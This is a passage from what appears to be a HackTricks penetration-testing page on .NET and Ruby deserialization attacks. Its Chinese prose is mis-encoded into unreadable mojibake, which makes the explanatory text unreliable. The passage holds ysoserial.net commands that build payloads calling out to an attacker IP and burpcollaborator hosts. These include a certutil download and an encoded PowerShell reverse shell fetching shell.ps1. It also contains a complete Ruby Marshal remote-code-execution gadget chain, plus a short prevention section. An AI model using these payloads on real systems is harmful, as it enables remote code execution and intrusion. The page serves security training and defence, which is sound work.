**ysoserial.net**çš„ä¸»è¦é€‰é¡¹æœ‰ï¼š**`--gadget`**ï¼Œ**`--formatter`**ï¼Œ**`--output`**å’Œ**`--plugin`**ã€‚

* **`--gadget`** ç”¨äºæŒ‡ç¤ºè¦æ»¥ç”¨çš„gadgetï¼ˆæŒ‡ç¤ºåœ¨ååºåˆ—åŒ–æœŸé—´å°†è¢«æ»¥ç”¨ä»¥æ‰§è¡Œå‘½ä»¤çš„ç±»/å‡½æ•°ï¼‰ã€‚
* **`--formatter`** ç”¨äºæŒ‡ç¤ºåºåˆ—åŒ–åˆ©ç”¨çš„æ–¹æ³•ï¼ˆæ‚¨éœ€è¦çŸ¥é“åç«¯ä½¿ç”¨å“ªä¸ªåº“æ¥ååºåˆ—åŒ–æœ‰æ•ˆè´Ÿè½½ï¼Œå¹¶ä½¿ç”¨ç›¸åŒçš„åº“æ¥åºåˆ—åŒ–å®ƒï¼‰
* **`--output`** ç”¨äºæŒ‡ç¤ºæ˜¯å¦è¦ä»¥**åŸå§‹**æˆ–**Base64**ç¼–ç çš„å½¢å¼æä¾›åˆ©ç”¨ã€‚è¯·æ³¨æ„ï¼Œ**ysoserial.net**å°†ä½¿ç”¨**UTF-16LE**ï¼ˆWindowsä¸Šé»˜è®¤ä½¿ç”¨çš„ç¼–ç ï¼‰å¯¹æœ‰æ•ˆè´Ÿè½½è¿›è¡Œç¼–ç ï¼Œå› æ­¤å¦‚æœæ‚¨è·å–åŸå§‹è´Ÿè½½å¹¶ä»…ä»Linuxæ§åˆ¶å°è¿›è¡Œç¼–ç ï¼Œå¯èƒ½ä¼šé‡åˆ°ä¸€äº›**ç¼–ç å…¼å®¹æ€§é—®é¢˜**ï¼Œè¿™å°†å¯¼è‡´åˆ©ç”¨æ— æ³•æ­£å¸¸å·¥ä½œï¼ˆåœ¨HTB JSONç›’å­ä¸­ï¼Œæœ‰æ•ˆè´Ÿè½½åœ¨UTF-16LEå’ŒASCIIä¸­éƒ½æœ‰æ•ˆï¼Œä½†è¿™å¹¶ä¸æ„å‘³ç€å®ƒæ€»æ˜¯æœ‰æ•ˆï¼‰ã€‚
* **`--plugin`** ysoserial.netæ”¯æŒæ’ä»¶æ¥æ„å»ºé’ˆå¯¹ç‰¹å®šæ¡†æ¶çš„åˆ©ç”¨ï¼Œå¦‚ViewState

#### æ›´å¤šysoserial.netå‚æ•°

* `--minify`å°†æä¾›ä¸€ä¸ª**æ›´å°çš„æœ‰æ•ˆè´Ÿè½½**ï¼ˆå¦‚æœå¯èƒ½ï¼‰
* `--raf -f Json.Net -c "anything"` è¿™å°†æŒ‡ç¤ºå¯ä»¥ä¸æä¾›çš„æ ¼å¼åŒ–ç¨‹åºï¼ˆåœ¨æœ¬ä¾‹ä¸­ä¸º`Json.Net`ï¼‰ä¸€èµ·ä½¿ç”¨çš„æ‰€æœ‰gadgets
* `--sf xml` æ‚¨å¯ä»¥**æŒ‡å®šä¸€ä¸ªgadget**ï¼ˆ`-g`ï¼‰ï¼Œysoserial.netå°†æœç´¢åŒ…å«"xml"ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰çš„æ ¼å¼åŒ–ç¨‹åº

**ysoserialç¤ºä¾‹**ä»¥åˆ›å»ºåˆ©ç”¨ï¼š
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net**è¿˜æœ‰ä¸€ä¸ªéå¸¸æœ‰è¶£çš„å‚æ•°ï¼Œå¯ä»¥å¸®åŠ©æ›´å¥½åœ°ç†è§£æ¯ä¸ªæ¼æ´çš„å·¥ä½œåŸç†ï¼š`--test`ã€‚\
å¦‚æœä½ æŒ‡å®šäº†è¿™ä¸ªå‚æ•°ï¼Œ**ysoserial.net**å°†åœ¨æœ¬åœ°**å°è¯•**æ‰§è¡Œæ¼æ´ï¼Œè¿™æ ·ä½ å°±å¯ä»¥æµ‹è¯•ä½ çš„æœ‰æ•ˆè½½è·æ˜¯å¦èƒ½æ­£å¸¸å·¥ä½œã€‚\
è¿™ä¸ªå‚æ•°å¾ˆæœ‰å¸®åŠ©ï¼Œå› ä¸ºå¦‚æœä½ æŸ¥çœ‹ä»£ç ï¼Œä½ ä¼šå‘ç°åƒä¸‹é¢è¿™æ ·çš„ä»£ç å—ï¼ˆæ¥è‡ª[ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)ï¼‰ï¼š
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
è¿™æ„å‘³ç€ä¸ºäº†æµ‹è¯•æ¼æ´ï¼Œä»£ç å°†è°ƒç”¨[serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)ã€‚
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
åœ¨**ä¹‹å‰çš„ä»£ç ä¸­å­˜åœ¨æ¼æ´**ã€‚å› æ­¤ï¼Œå¦‚æœåœ¨ä¸€ä¸ª.Netåº”ç”¨ç¨‹åºä¸­æ‰¾åˆ°ç±»ä¼¼çš„ä»£ç ï¼Œé‚£ä¹ˆå¾ˆå¯èƒ½è¯¥åº”ç”¨ç¨‹åºä¹Ÿå­˜åœ¨æ¼æ´ã€‚\
å› æ­¤ï¼Œ**`--test`**å‚æ•°å…è®¸æˆ‘ä»¬äº†è§£**å“ªäº›ä»£ç å—å®¹æ˜“å—åˆ°ysoserial.netåˆ›å»ºçš„ååºåˆ—åŒ–æ¼æ´çš„æ”»å‡»**ã€‚

### ViewState

è¯·æŸ¥çœ‹[å…³äº**å¦‚ä½•å°è¯•åˆ©ç”¨.Netçš„\_\_ViewStateå‚æ•°çš„å¸–å­**](exploiting-\_\_viewstate-parameter.md)ä»¥**æ‰§è¡Œä»»æ„ä»£ç **ã€‚å¦‚æœä½ **å·²ç»çŸ¥é“å—å®³è€…æœºå™¨ä½¿ç”¨çš„å¯†é’¥**ï¼Œ[**é˜…è¯»è¿™ç¯‡å¸–å­ä»¥äº†è§£å¦‚ä½•æ‰§è¡Œä»£ç **](exploiting-\_\_viewstate-knowing-the-secret.md)**ã€‚**

### **é¢„é˜²æªæ–½**

ä¸è¦å…è®¸æ•°æ®æµå®šä¹‰æµå°†è¢«ååºåˆ—åŒ–ä¸ºçš„å¯¹è±¡ç±»å‹ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå¯èƒ½çš„è¯ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨`DataContractSerializer`æˆ–`XmlSerializer`æ¥é˜²æ­¢è¿™ç§æƒ…å†µå‘ç”Ÿã€‚

åœ¨ä½¿ç”¨`JSON.Net`æ—¶ï¼Œè¯·ç¡®ä¿`TypeNameHandling`ä»…è®¾ç½®ä¸º`None`ã€‚
```
TypeNameHandling = TypeNameHandling.None
```
å¦‚æœè¦ä½¿ç”¨`JavaScriptSerializer`ï¼Œåˆ™ä¸è¦ä¸`JavaScriptTypeResolver`ä¸€èµ·ä½¿ç”¨ã€‚

å¦‚æœå¿…é¡»ååºåˆ—åŒ–å®šä¹‰äº†è‡ªå·±ç±»å‹çš„æ•°æ®æµï¼Œåˆ™åº”é™åˆ¶å…è®¸ååºåˆ—åŒ–çš„ç±»å‹ã€‚ä½†æ˜¯ï¼Œåº”è¯¥æ„è¯†åˆ°è¿™ä»ç„¶å­˜åœ¨é£é™©ï¼Œå› ä¸ºè®¸å¤šæœ¬æœºçš„.Netç±»å‹æœ¬èº«å¯èƒ½æ˜¯å±é™©çš„ã€‚ä¾‹å¦‚ï¼š
```
System.IO.FileInfo
```
`FileInfo` å¯¹è±¡å¼•ç”¨å®é™…ä½äºæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œå½“è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œå¯ä»¥æ›´æ”¹è¿™äº›æ–‡ä»¶çš„å±æ€§ï¼Œä¾‹å¦‚å°†å…¶è®¾ç½®ä¸ºåªè¯»ï¼Œä»è€Œåˆ›å»ºæ½œåœ¨çš„æ‹’ç»æœåŠ¡æ”»å‡»ã€‚

å³ä½¿æ‚¨å·²ç»é™åˆ¶äº†å¯ä»¥è¿›è¡Œååºåˆ—åŒ–çš„ç±»å‹ï¼Œä¹Ÿè¦è®°ä½æŸäº›ç±»å‹å…·æœ‰é£é™©çš„å±æ€§ã€‚ä¾‹å¦‚ï¼Œ`System.ComponentModel.DataAnnotations.ValidationException` å…·æœ‰ä¸€ä¸ªåä¸º `Value` çš„å±æ€§ï¼Œå…¶ç±»å‹ä¸º `Object`ã€‚å¦‚æœå…è®¸ååºåˆ—åŒ–æ­¤ç±»å‹ï¼Œåˆ™æ”»å‡»è€…å¯ä»¥å°† `Value` å±æ€§è®¾ç½®ä¸ºä»»ä½•ä»–ä»¬é€‰æ‹©çš„å¯¹è±¡ç±»å‹ã€‚

åº”è¯¥é˜²æ­¢æ”»å‡»è€…æ“çºµå°†è¢«å®ä¾‹åŒ–çš„ç±»å‹ã€‚å¦‚æœè¿™æ˜¯å¯èƒ½çš„ï¼Œç”šè‡³å¯ä»¥ç¯¡æ”¹ `DataContractSerializer` æˆ– `XmlSerializer`ã€‚
```
// Action below is dangerous if the attacker can change the data in the database
var typename = GetTransactionTypeFromDatabase();

var serializer = new DataContractJsonSerializer(Type.GetType(typename));

var obj = serializer.ReadObject(ms);
```
åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼ŒæŸäº› .Net ç±»å‹ä¸­å¯èƒ½å‘ç”Ÿæ‰§è¡Œæ“ä½œã€‚åˆ›å»ºå¦‚ä¸‹æ‰€ç¤ºçš„æ§ä»¶æ˜¯æ— æ•ˆçš„ã€‚
```
var suspectObject = myBinaryFormatter.Deserialize(untrustedData);

//Check below is too late! Execution may have already occurred.
if (suspectObject is SomeDangerousObjectType)
{
//generate warnings and dispose of suspectObject
}
```
å¯¹äº`BinaryFormatter`å’Œ`JSON.Net`ï¼Œå¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰çš„`SerializationBinder`åˆ›å»ºæ›´å®‰å…¨çš„ç™½åå•æ§åˆ¶å½¢å¼ã€‚

è¦åŠæ—¶äº†è§£å·²çŸ¥çš„.Netä¸å®‰å…¨ååºåˆ—åŒ–å·¥å…·ï¼Œå¹¶ç‰¹åˆ«æ³¨æ„åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­å¯ä»¥åˆ›å»ºæ­¤ç±»ç±»å‹çš„ä½ç½®ã€‚**ååºåˆ—åŒ–å™¨åªèƒ½å®ä¾‹åŒ–å®ƒæ‰€çŸ¥é“çš„ç±»å‹**ã€‚

å°½é‡å°†å¯èƒ½åˆ›å»ºæ½œåœ¨å·¥å…·çš„ä»£ç ä¸å…·æœ‰äº’è”ç½‘è¿æ¥çš„ä»£ç åˆ†å¼€ã€‚ä¾‹å¦‚ï¼Œåœ¨WPFåº”ç”¨ç¨‹åºä¸­ä½¿ç”¨çš„`System.Windows.Data.ObjectDataProvider`æ˜¯ä¸€ä¸ªå·²çŸ¥çš„å·¥å…·ï¼Œå…è®¸ä»»æ„æ–¹æ³•è°ƒç”¨ã€‚åœ¨ååºåˆ—åŒ–ä¸å—ä¿¡ä»»çš„æ•°æ®çš„RESTæœåŠ¡é¡¹ç›®ä¸­å¼•ç”¨æ­¤ç¨‹åºé›†å°†æ˜¯æœ‰é£é™©çš„ã€‚

### **å‚è€ƒèµ„æ–™**

* Javaå’Œ.Net JSONååºåˆ—åŒ–**è®ºæ–‡**ï¼š[**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**ï¼Œ**æ¼”è®²ï¼š[https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c)å’Œå¹»ç¯ç‰‡ï¼š[https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

Rubyåœ¨**marshal**åº“ä¸­æœ‰ä¸¤ç§æ–¹æ³•æ¥å®ç°åºåˆ—åŒ–ï¼šç¬¬ä¸€ç§æ–¹æ³•æ˜¯**dump**ï¼Œå°†å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚æµï¼ˆ**åºåˆ—åŒ–**ï¼‰ã€‚ç¬¬äºŒç§æ–¹æ³•æ˜¯**load**ï¼Œå°†å­—èŠ‚æµå†æ¬¡è½¬æ¢ä¸ºå¯¹è±¡ï¼ˆ**ååºåˆ—åŒ–**ï¼‰ã€‚
Rubyä½¿ç”¨HMACå¯¹åºåˆ—åŒ–å¯¹è±¡è¿›è¡Œç­¾åï¼Œå¹¶å°†å¯†é’¥ä¿å­˜åœ¨ä»¥ä¸‹æ–‡ä»¶ä¹‹ä¸€ä¸­ï¼š

* config/environment.rb
* config/initializers/secret\_token.rb
* config/secrets.yml
* /proc/self/environ

Ruby 2.Xé€šç”¨ååºåˆ—åŒ–åˆ°RCE gadgeté“¾ï¼ˆæ›´å¤šä¿¡æ¯è¯·å‚è§[https://www.elttam.com/blog/ruby-deserialization/](https://www.elttam.com/blog/ruby-deserialization/)ï¼‰ï¼š
```ruby
#!/usr/bin/env ruby

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
åˆ©ç”¨Ruby On Railsçš„å…¶ä»–RCEé“¾ï¼š[https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
